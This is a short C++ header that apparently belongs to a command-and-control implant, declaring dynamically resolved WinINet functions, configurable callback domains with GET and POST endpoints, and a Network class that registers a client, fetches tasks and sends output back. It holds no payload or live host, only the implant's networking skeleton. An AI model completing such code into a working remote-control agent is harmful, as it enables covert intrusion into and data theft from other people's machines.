#pragma once
#include <Windows.h>
#include <wininet.h>
#include "common.hpp"

#define DECL(x) decltype(x) * x;

struct HTTPAPIS {
	DECL(InternetOpenA);
	DECL(InternetConnectA);
	DECL(HttpOpenRequestA);
	DECL(HttpSendRequestA);
	DECL(InternetReadFile);
	DECL(InternetCloseHandle);
	DECL(InternetSetOptionA);
	DECL(HttpAddRequestHeadersA);
};

struct Domain {
	PCHAR host;
	PCHAR GetEndpoint;
	PCHAR PostEndpoint;
	UINT port;
	BOOL UseSSL;
};

struct Header {
	PCHAR Name;
	PCHAR Value;
};

struct HTTPCONF {
	struct Domain* domains;
	struct Header* Headers;
};

class Network {
	HTTPAPIS* HttpApis;
	HTTPCONF* HttpConf;


public:
	Network();
	BOOL RegisterClient(PBYTE Data, SIZE_T DataLength);
	BOOL GetTask(PBYTE OutData, SIZE_T BufSize);
	BOOL SendOutput(PBYTE InData, SIZE_T InLen);

};

extern Network* g_Network;